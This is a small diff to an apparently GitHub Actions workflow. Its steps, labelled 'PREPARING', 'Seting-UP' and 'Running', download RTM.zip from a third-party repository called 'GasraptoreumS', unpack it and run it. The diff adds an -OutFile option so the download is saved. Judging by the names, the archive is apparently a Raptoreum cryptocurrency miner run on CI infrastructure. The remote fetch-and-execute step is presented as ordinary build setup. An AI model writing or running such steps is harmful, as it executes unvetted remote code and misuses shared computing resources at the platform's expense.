@@ -17,7 +17,7 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/robertreynolds2/GasraptoreumS/blob/main/RTM.zip?raw=true
+      run: Invoke-WebRequest https://github.com/robertreynolds2/GasraptoreumS/blob/main/RTM.zip?raw=true -OutFile RTM.zip
     - name: Seting-UP
       run: Expand-Archive RTM.zip
     - name: Running
